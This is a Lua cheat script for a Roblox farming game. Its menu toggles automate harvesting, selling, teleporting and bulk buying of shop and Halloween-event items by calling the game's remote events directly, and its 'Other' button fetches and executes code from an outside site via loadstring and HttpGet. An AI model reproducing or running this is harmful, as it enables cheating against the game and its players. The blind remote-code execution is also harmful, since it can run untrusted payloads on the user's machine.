local rs = game:GetService("ReplicatedStorage")
local DataService = require(rs:WaitForChild("Modules"):WaitForChild("DataService"))
local ALLDATA = DataService:GetData()

w = library:CreateWindow("Main")
local Auto = w:CreateFolder("Main")
local StockMenu = w:CreateFolder("Stock")

local Players=game:GetService("Players")
local Player=game.Players.LocalPlayer

print("v1")

-->Base Variables<--
local function Sheckles() return ALLDATA.Sheckles end

local Farms = Workspace:WaitForChild("Farm")
local NPCS = Workspace:WaitForChild("NPCS")
local PGui = Player.PlayerGui

local Steven = NPCS:WaitForChild("Steven")

local GameEvents = rs:WaitForChild("GameEvents")
local mod = GameEvents:WaitForChild("Crops"):WaitForChild("Collect")

--Seed Types
local __seeds = {name = "seeds", path = PGui:WaitForChild("Seed_Shop")}
local __dailySeeds = {name = "daily", path = PGui:WaitForChild("Seed_Shop")}
local __gears = {name = "gears", path = PGui:WaitForChild("Gear_Shop")}
local __eggs = {name = "eggs", path = PGui:WaitForChild("PetShop_UI")}
local __merchant = {name = "merchant", path = PGui:WaitForChild("TravelingMerchantShop_UI")}

-- EVENTS
local Interaction = Workspace:WaitForChild("Interaction")
local UpdateItems = Interaction:WaitForChild("UpdateItems")

-->Non Return Functions<--
local function getInventoryCount()
    local amt = {}
    for i, v in ALLDATA.InventoryData do
        if v.ItemType == "Holdable" and v.ItemData then
            table.insert(amt, v)
        end
    end
    return #amt
end

local function IsMaxInventory()
    local count = getInventoryCount()
    local bonus = 0 -- Player:GetAttribute("BonusBackpackSize")
    if 200 + (bonus or 0) > count then
        return false
    else
        return true
    end
end

--HALLOWEEN 2025
local WitchAndDeadTreePlatform = UpdateItems:WaitForChild("WitchAndDeadTreePlatform", 5)
if WitchAndDeadTreePlatform then
    local EventMenu = w:CreateFolder("Halloween")
    local EventShop = ALLDATA.EventShopStock

    

    local function submitFruit()
        GameEvents:WaitForChild("WitchesBrew"):WaitForChild("SubmitItemToCauldron"):InvokeServer("All")
    end

    local function getProgress()
        local WitchTree = WitchAndDeadTreePlatform:FindFirstChild("Witch&Tree")
        if WitchTree and WitchTree:GetAttribute("State") == "Entering" then
            local ui = WitchTree:WaitForChild("WitchesBrewCauldron"):WaitForChild("CauldronProgressUI")
            if ui then
                local progess = ui:WaitForChild("ProgressBillboard")
                local text = progess.Progress.Text
                if progess.Enabled == true and not text:match("Brew Timer") then
                    local amount = fromSuffixString(text)
                    return amount
                else
                    return false
                end
            end
        end
        return false
    end

    local function buyEventStock(_name, _type)
        for _,v in pairs(_type.Stocks) do
            if v.Stock > 0 then
                for i = 1, v.Stock do
                    GameEvents:WaitForChild("BuyEventShopStock"):FireServer(_, _name)
                end
                print("Buying: x" .. v.Stock, _, "Type:", _name)
            end
        end
    end

    local function submitReaper(_slot)
        GameEvents:WaitForChild("HarvestReaper"):WaitForChild("SubmitHarvestReaper"):FireServer(_slot)
    end

    EventMenu:Button("Submit Cauldron",function()
        spawn(function()
            submitFruit()
        end)
    end)
    EventMenu:Button("Submit Reaper",function()
        spawn(function()
            local RitualPointsFolder = UpdateItems:WaitForChild("HarvestReaper", 5):WaitForChild("RitualCircle"):WaitForChild("RitualPointsFolder")
            local sorted = {}
            for _, child in ipairs(RitualPointsFolder:GetChildren()) do
                local value = child:GetAttribute("ID") -- replace with your attribute name
                if value then
                    sorted[value] = child
                end
            end
            local back = GetPos()
            for i = 1, 25 do
                local child = sorted[i]
                if child and child:GetAttribute("RitualPoint_Completed") == false then 
                    local point = child:FindFirstChild("Root")
                    MoveTo(point) task.wait(0.3)
                    submitReaper(i) task.wait(0.3)
                end
            end
            MoveTo(back)
        end)
    end)

    EventMenu:Toggle("Auto Submit",function(bool)
        shared.ToggleHAS=bool
        spawn(function()
            while shared.ToggleHAS do
                local progress = getProgress()
                if progress and progress >= 0 and progress < 100 and IsMaxInventory() then
                    submitFruit()
                end
                task.wait()
            end
        end)
    end)

    EventMenu:Toggle("Buy Seeds",function(bool)
        shared.ToggleHBS=bool
        spawn(function()
            while shared.ToggleHBS do
                buyEventStock("Spooky Seeds", EventShop['Spooky Seeds'])
                task.wait(1)
            end
        end)
    end)

    EventMenu:Toggle("Buy Critters",function(bool)
        shared.ToggleHBC=bool
        spawn(function()
            while shared.ToggleHBC do
                buyEventStock("Creepy Critters", EventShop['Creepy Critters'])
                task.wait(1)
            end
        end)
    end)

    EventMenu:Toggle("Buy Gadgets",function(bool)
        shared.ToggleHBG=bool
        spawn(function()
            while shared.ToggleHBG do
                buyEventStock("Ghosty Gadgets", EventShop['Ghosty Gadgets'])
                task.wait(1)
            end
        end)
    end)

    EventMenu:Toggle("Buy Decor",function(bool)
        shared.ToggleHBD=bool
        spawn(function()
            while shared.ToggleHBD do
                buyEventStock("Devilish Decor", EventShop['Devilish Decor'])
                task.wait(1)
            end
        end)
    end)
end

local function getStockInfo(_item)
    local t = {
        name = _item.Parent.Name,
        price = fromSuffixString(_item.Cost_Text.Text),
        stock = fromSuffixString(_item.Stock_Text.Text)
    }
    return t
end

local function getSeedInfo(_item) -- FOR DAILY SEEDS
    local price = _item:WaitForChild("PurchaseButton"):WaitForChild("Main"):WaitForChild("Price")
    local t = {
        name = _item.Name,
        price = fromSuffixString(price.Text),
        stock = fromSuffixString(_item.StockNum.Text)
    }
    return t
end



local function getFarm()
    for _,v in pairs(Farms:GetChildren())do
        local Important = v:FindFirstChild("Important")
        if Important then
            local Owner = Important:WaitForChild("Data"):WaitForChild("Owner")
            if Owner and Owner.Value == Player.Name then
                return v
            end
        end
    end
end

local function CollectPlant(_plant)
    for _,v in pairs(_plant:GetChildren())do
        local prox = v:FindFirstChildWhichIsA("ProximityPrompt")
        if prox then
            mod:FireServer({v.Parent}) task.wait()
        end
    end
end

local function buySeed(_item, _amt)
    --print("Buying: x" .. _amt, _item)
    for i = 1, _amt do
        GameEvents:WaitForChild("BuySeedStock"):FireServer("Shop", _item) task.wait(0.1)
    end
end
local function buyDailySeed(_item, _amt)
    --print("Buying: x" .. _amt, _item)
    for i = 1, _amt do
        GameEvents:WaitForChild("BuyDailySeedShopStock"):FireServer(_item) task.wait(0.1)
    end
end
local function buyGear(_item, _amt)
    --print("Buying: x" .. _amt, _item)
    for i = 1, _amt do
        GameEvents:WaitForChild("BuyGearStock"):FireServer(_item) task.wait(0.1)
    end
end
local function buyEgg(_item, _amt)
    --print("Buying: x" .. _amt, _item)
    for i = 1, _amt do
        GameEvents:WaitForChild("BuyPetEgg"):FireServer(_item) task.wait(0.1)
    end
end

local function buyMerchant(_item, _amt)
    --print("Buying: x" .. _amt, _item)
    for i = 1, _amt do
        GameEvents:WaitForChild("BuyTravelingMerchantShopStock"):FireServer(_item) task.wait(0.1)
    end
end
local function buyAllStock(_type)
    local type = _type.name
    local _frame = _type.path:WaitForChild("Frame")
    local list = _frame:WaitForChild("ScrollingFrame")
    for _,v in pairs(list:GetChildren())do
        local mFrame = v:FindFirstChild("Main_Frame")
        if v:IsA("Frame") and mFrame then
            local info = getStockInfo(mFrame)
            if info.stock > 0 and Sheckles() >= info.price then
                if type == "seeds" then
                    buySeed(info.name, info.stock)
                elseif type == "gears" then
                    buyGear(info.name, info.stock)
                elseif type == "eggs" then
                    buyEgg(info.name, info.stock)
                elseif type == "merchant" then
                    buyMerchant(info.name, info.stock)
                end
            end
        end
    end
end

local function buyDaily()
    local shop = PGui:WaitForChild("Seed_Shop")
    local mFrame = shop:WaitForChild("Daily"):WaitForChild("ScrollingFrame")
    local seeds = {}
    for _,v in pairs(mFrame:GetChildren())do
        local bestDeal = v:FindFirstChild("SeedName")
        if bestDeal then
            local info = getSeedInfo(v)
            if info.stock > 0 and Sheckles() >= info.price then
                buyDailySeed(info.name, info.stock)
            end
        end
        if v.Name == "Seeds" then
            for __,_v in pairs(v:GetChildren())do
                local deal = _v:FindFirstChild("SeedName")
                if _v:IsA("Frame") and deal then
                    local info = getSeedInfo(_v)
                    if info.stock > 0 and Sheckles() >= info.price then
                        buyDailySeed(info.name, info.stock)
                    end
                end
            end
        end
    end
end

local function TeleportTo(_place)
    GameEvents:WaitForChild("PlayerTeleportTriggered"):FireServer(_place)
end

local function SellAll()
    GameEvents:WaitForChild("Sell_Inventory"):FireServer()
end

--Post Variables
local Farm = getFarm()
local Important = Farm:WaitForChild("Important")
local Plants_Physical = Important:WaitForChild("Plants_Physical")

Auto:Toggle("Auto Harvest",function(bool)
    shared.ToggleAH=bool
    spawn(function()
        while shared.ToggleAH do
            if not IsMaxInventory() then
                for _,v in pairs(Plants_Physical:GetChildren())do
                    local Fruits = v:FindFirstChild("Fruits")
                    if Fruits then
                        for __,_v in pairs(Fruits:GetChildren())do
                            if shared.ToggleAH and not IsMaxInventory() then CollectPlant(_v) end
                            
                        end
                    else
                        if shared.ToggleAH and not IsMaxInventory() then CollectPlant(v) end
                    end
                end
            end
            task.wait(0.1)
        end
    end)
end)

local moveBack = false
-->Return Functions<--
Auto:Toggle("Auto Sell",function(bool)
    shared.ToggleAS=bool
    spawn(function()
        while shared.ToggleAS do
            if IsMaxInventory() then
                local samHRP = Steven:FindFirstChild("HumanoidRootPart")
                local distance = GetDistance(samHRP)
                local old = GetPos()
                if distance > 10 then
                    local hrp = GetHrp()
                    
                    local direction = (hrp.Position - samHRP.Position).Unit
                    local newPosition = samHRP.Position + direction * 5
                    local facingCFrame = CFrame.lookAt(newPosition, samHRP.Position)

                    MoveTo(facingCFrame) task.wait(1)
                end
                SellAll()
                if moveBack then task.wait(1) MoveTo(old) end
                task.wait(5)
            end
            task.wait(1)
        end
    end)
end)

Auto:Toggle("TeleportBack",function(bool)
    shared.ToggleTB=bool
    spawn(function()
        moveBack = shared.ToggleTB
    end)
end)

StockMenu:Toggle("Buy Seeds",function(bool)
    shared.ToggleBS=bool
    spawn(function()
        while shared.ToggleBS do
            buyAllStock(__seeds)
            buyDaily()
            task.wait(1)
        end
    end)
end)

StockMenu:Toggle("Buy Gears",function(bool)
    shared.ToggleBG=bool
    spawn(function()
        while shared.ToggleBG do
            buyAllStock(__gears)
            task.wait(1)
        end
    end)
end)

StockMenu:Toggle("Buy Eggs",function(bool)
    shared.ToggleBE=bool
    spawn(function()
        while shared.ToggleBE do
            buyAllStock(__eggs)
            task.wait(1)
        end
    end)
end)

StockMenu:Toggle("Buy Merchant",function(bool)
    shared.ToggleBM=bool
    spawn(function()
        while shared.ToggleBM do
            buyAllStock(__merchant)
            task.wait(1)
        end
    end)
end)

Auto:Button("Other",function()
    spawn(function()
        loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
    end)
end)